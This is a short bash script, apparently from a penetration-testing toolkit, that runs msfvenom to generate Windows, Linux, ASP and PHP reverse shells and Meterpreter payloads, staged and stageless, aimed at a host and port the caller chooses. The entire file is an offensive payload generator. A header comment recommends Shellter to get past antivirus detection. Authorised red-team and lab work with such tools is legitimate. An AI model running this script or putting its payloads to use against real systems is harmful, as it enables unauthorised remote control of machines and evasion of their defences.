#!/bin/bash
# Generates various reverse msfvenom payloads for the given hostname/IP and port
# Includes Windows and Linux reverse shells, and Meterpreter reverse TCP/HTTPS (both staged and stageless)
# Generated filenames are verbose for convenience, renaming is recommended
#
# NOTE: Payloads are generated raw, and will be easily detected by most AV solutions.
# If you don't want this to happen, use Shellter.

if [ -z "$1" ] || [ -z "$2" ]; then
	echo "Usage: ./genvenom.sh <hostname/IP> <port>"
  exit 0
fi

HOST=$1
PORT=$2

# Windows payloads (staged)
msfvenom -p windows/meterpreter/reverse_https LHOST=$HOST LPORT=$PORT -f exe > meterp_revhttps_$HOST-$PORT.exe
msfvenom -p windows/meterpreter/reverse_tcp LHOST=$HOST LPORT=$PORT -f exe > meterp_revtcp_$HOST-$PORT.exe
msfvenom -p windows/shell/reverse_tcp LHOST=$HOST LPORT=$PORT -f exe > shell_revtcp_$HOST-$PORT.exe

# Windows payloads (stageless)
msfvenom -p windows/meterpreter_reverse_https LHOST=$HOST LPORT=$PORT -f exe > stageless_meterp_revhttps_$HOST-$PORT.exe
msfvenom -p windows/meterpreter_reverse_tcp LHOST=$HOST LPORT=$PORT -f exe > stageless_meterp_revtcp_$HOST-$PORT.exe
msfvenom -p windows/shell_reverse_tcp LHOST=$HOST LPORT=$PORT -f exe > stageless_shell_revtcp_$HOST-$PORT.exe

# Linux x86 payloads (both)
msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=$HOST LPORT=$PORT -f elf > meterp_revtcp_$HOST-$PORT.elf
msfvenom -p linux/x86/shell/reverse_tcp LHOST=$HOST LPORT=$PORT -f elf > shell_revtcp_$HOST-$PORT.elf
msfvenom -p linux/x86/shell_reverse_tcp LHOST=$HOST LPORT=$PORT -f elf > stageless_shell_revtcp_$HOST-$PORT.elf

# Webshells (staged)
msfvenom -p windows/meterpreter/reverse_tcp LHOST=$HOST LPORT=$PORT -f asp > meterp_revtcp_$HOST-$PORT.asp
msfvenom -p windows/shell/reverse_tcp LHOST=$HOST LPORT=$PORT -f asp > shell_revtcp_$HOST-$PORT.asp
msfvenom -p php/meterpreter/reverse_tcp LHOST=$HOST LPORT=$PORT -f raw > meterp_revtcp_$HOST-$PORT.php

# Webshells (stageless)
msfvenom -p windows/meterpreter_reverse_tcp LHOST=$HOST LPORT=$PORT -f asp > stageless_meterp_revtcp_$HOST-$PORT.asp
msfvenom -p windows/shell_reverse_tcp LHOST=$HOST LPORT=$PORT -f asp > stageless_shell_revtcp_$HOST-$PORT.asp
msfvenom -p php/meterpreter_reverse_tcp LHOST=$HOST LPORT=$PORT -f raw > stageless_meterp_revtcp_$HOST-$PORT.php
msfvenom -p php/reverse_php LHOST=$HOST LPORT=$PORT -f raw > stageless_shell_revphp_$HOST-$PORT.php

